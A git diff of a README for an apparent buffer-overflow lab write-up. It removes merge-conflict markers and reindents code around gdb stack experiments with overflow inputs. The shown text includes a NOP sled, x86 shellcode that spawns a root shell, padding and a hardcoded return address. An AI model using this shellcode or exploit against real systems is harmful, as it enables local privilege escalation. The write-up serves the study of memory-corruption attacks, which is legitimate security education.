@@ -48,11 +48,8 @@ ln -s /bin/zsh /bin/sh
 
 ## Experiment 1
 
-<<<<<<< HEAD
 #### Valid Input
 
-=======
->>>>>>> 43718e3751c1415d93bb6a9ffebfefaa3055a0ba
 ![valid-input-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/valid-input-1.png)
 
 We firstly executed these commands to check stack boundaries:
@@ -73,15 +70,12 @@ We also defined breakpoints at *main+48 (at return instruction of main) and *bof
 
 Here we can see that 's' (73 in ASCII) characters fill the appropriate field of stack and return address  wasn't overwritten by 's' characters.
 
-<<<<<<< HEAD
 ```python
 #!/usr/bin/python
 
 print  's' * 64
 ```
 
-=======
->>>>>>> 43718e3751c1415d93bb6a9ffebfefaa3055a0ba
 ![valid-input-3](https://github.com/wlgzaor/Buffer-Overflow/blob/master/valid-input-3.png)
 
 We checked current eip by typing info frame command and there is no changes. Later we will see that how the instruction pointer changes when user enters invalid input.
@@ -131,15 +125,12 @@ The previous frame's stack pointer point to (the caller frame), at the moment of
 
 Now we see that return address (first word after ebp) overwritten to 0737373 (ebp was 0*bfffef18).
 
-<<<<<<< HEAD
 ```python
 #!/usr/bin/python
 
 print  's' * 116
 ```
 
-=======
->>>>>>> 43718e3751c1415d93bb6a9ffebfefaa3055a0ba
 ![invalid-input-1](https://github.com/wlgzaor/Buffer-Overflow/blob/master/invalid-input-2.png)
 
 We can check eip register to see changes using info frame. Saved eip updated to 0737373 and there have no instruction like 0737373. So we got segmentation  fault.
@@ -155,8 +146,8 @@ Return address should hit the NOP's area. So eip will be point one of the starti
 ```python
 #!/usr/bin/python
 
-    nop = '\x90' * 64
-    shellcode =     ('\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2 f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80')
+   nop = '\x90' * 64
+   shellcode =     ('\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2 f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80')
 
    padding = 's' * 16
    eip = '\xe0\xee\xff\xbf'  
